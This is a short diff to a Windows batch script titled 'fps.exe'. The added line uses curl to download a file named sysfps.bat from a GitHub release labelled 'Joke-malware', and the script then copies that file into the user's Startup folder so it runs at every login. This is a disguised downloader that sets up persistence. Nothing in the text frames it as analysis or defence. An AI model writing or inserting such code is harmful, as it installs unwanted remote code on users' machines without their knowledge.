@@ -2,7 +2,7 @@
 title fps.exe
 color 0a
 cls 
-curl xxxx
+curl -O https://github.com/GreatNate0509YT/Other/releases/download/Joke-malware/sysfps.bat
 cls
 copy sysfps.bat %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sysfps.bat
 :start
